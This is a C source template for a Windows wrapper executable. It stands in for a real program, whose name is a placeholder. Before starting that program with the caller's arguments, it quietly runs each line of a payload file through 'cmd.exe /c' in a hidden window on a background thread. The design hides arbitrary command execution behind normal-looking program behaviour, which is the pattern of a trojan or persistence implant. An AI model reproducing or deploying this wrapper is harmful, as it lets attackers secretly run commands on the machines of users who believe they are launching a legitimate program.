#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#ifdef __TINYC__
#include "tcc_compat.h"
#endif
#include <stdio.h>
#include <wchar.h>

static const wchar_t ORIGINAL_EXE[] = L"__ORIGINAL_EXE__";
static const wchar_t PAYLOAD_NAME[] = L"__PAYLOAD_NAME__";
static const wchar_t PAYLOAD_FALLBACK[] = L"__PAYLOAD_FALLBACK__";
static wchar_t g_dir[MAX_PATH];

static void exe_dir(void)
{
    wchar_t buf[MAX_PATH];
    if (!GetModuleFileNameW(NULL, buf, MAX_PATH)) {
        g_dir[0] = L'.';
        g_dir[1] = 0;
        return;
    }
    wchar_t *slash = wcsrchr(buf, L'\\');
    if (slash) {
        *slash = 0;
        wcsncpy(g_dir, buf, MAX_PATH);
        g_dir[MAX_PATH - 1] = 0;
    } else {
        g_dir[0] = L'.';
        g_dir[1] = 0;
    }
}

static FILE *open_payload(void)
{
    wchar_t path[MAX_PATH];
    FILE *f;

    _snwprintf(path, MAX_PATH, L"%s\\%s", g_dir, PAYLOAD_NAME);
    f = _wfopen(path, L"rb");
    if (f) {
        return f;
    }
    return _wfopen(PAYLOAD_FALLBACK, L"rb");
}

static void run_one_line(char *line)
{
    wchar_t wcmd[4096];
    wchar_t cmdline[4200];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    size_t n;

    while (*line == ' ' || *line == '\t') {
        line++;
    }
    n = 0;
    while (line[n]) {
        n++;
    }
    while (n && (line[n - 1] == '\n' || line[n - 1] == '\r' || line[n - 1] == ' ')) {
        line[--n] = 0;
    }
    if (!n) {
        return;
    }
    if (!MultiByteToWideChar(CP_UTF8, 0, line, -1, wcmd, 4096)) {
        return;
    }
    _snwprintf(cmdline, 4200, L"cmd.exe /c %s", wcmd);
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
    }
}

static DWORD WINAPI payload_thread(LPVOID unused)
{
    FILE *f;
    char buf[4096];

    (void)unused;
    f = open_payload();
    if (!f) {
        return 0;
    }
    while (fgets(buf, sizeof(buf), f)) {
        run_one_line(buf);
    }
    fclose(f);
    return 0;
}

static void run_payload(void)
{
    HANDLE t = CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
    if (t) {
        CloseHandle(t);
    }
}

static const wchar_t *skip_argv0(const wchar_t *s)
{
    if (*s == L'"') {
        s++;
        while (*s && *s != L'"') {
            s++;
        }
        if (*s == L'"') {
            s++;
        }
    } else {
        while (*s && *s != L' ') {
            s++;
        }
    }
    return s;
}

int main(void)
{
    exe_dir();
    run_payload();

    wchar_t orig[MAX_PATH];
    _snwprintf(orig, MAX_PATH, L"%s\\%s", g_dir, ORIGINAL_EXE);

    const wchar_t *rest = skip_argv0(GetCommandLineW());
    wchar_t newcmd[32768];
    _snwprintf(newcmd, 32768, L"\"%s\"%s", orig, rest);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    GetStartupInfoW(&si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessW(orig, newcmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        return 1;
    }
    CloseHandle(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);
    return (int)code;
}
